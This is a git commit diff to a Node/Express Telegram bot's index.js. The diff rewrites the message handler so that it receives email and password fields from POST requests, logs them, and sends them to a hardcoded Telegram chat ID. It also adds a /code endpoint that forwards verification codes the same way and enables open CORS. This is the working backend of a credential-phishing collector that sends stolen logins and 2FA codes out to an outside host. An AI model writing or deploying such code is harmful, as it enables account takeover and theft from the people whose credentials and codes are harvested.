0e16e25a2a0c7ad7ee97f34a73c1cb1df92110f8
haqqibrahim <enessyibrahim@gmail.com>
2024-02-02 18:00:22 +0100

    init 2

--- index.js
+++ index.js
@@ -2,6 +2,7 @@ require('dotenv').config()
 const express = require('express')
 const axios = require('axios')
 const bodyParser = require('body-parser')
+const cors = require('cors');
 
 const { TOKEN, SERVER_URL } = process.env
 const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}`
@@ -10,6 +11,7 @@ const WEBHOOK_URL = SERVER_URL + URI
 
 const app = express()
 app.use(bodyParser.json())
+app.use(cors()); // Use the cors middleware
 
 const init = async () => {
     const res = await axios.get(`${TELEGRAM_API}/setWebhook?url=${WEBHOOK_URL}`)
@@ -19,12 +21,33 @@ const init = async () => {
 app.post(URI, async (req, res) => {
     console.log(req.body)
 
-    const chatId = req.body.message.chat.id
-    const text = req.body.message.text
+    email = req.body.email
+    password = req.body.password
+  
+
+    // You can use email and password in your desired way (e.g., send to another API, save to a database, etc.)
+    console.log('Received Email:', email)
+    console.log('Received Password:', password)
 
     await axios.post(`${TELEGRAM_API}/sendMessage`, {
-        chat_id: chatId,
-        text: text
+        chat_id: "1636602095",
+        text: `The Email is ${email}, the Password is ${password}`
+    })
+    return res.send()
+})
+
+app.post("/code", async (req, res) => {
+    console.log(req.body)
+
+    code = req.body.code
+  
+
+    // You can use email and password in your desired way (e.g., send to another API, save to a database, etc.)
+    console.log('Received Code:', code)
+
+    await axios.post(`${TELEGRAM_API}/sendMessage`, {
+        chat_id: "1636602095",
+        text: `The verification code is ${code}`
     })
     return res.send()
 })
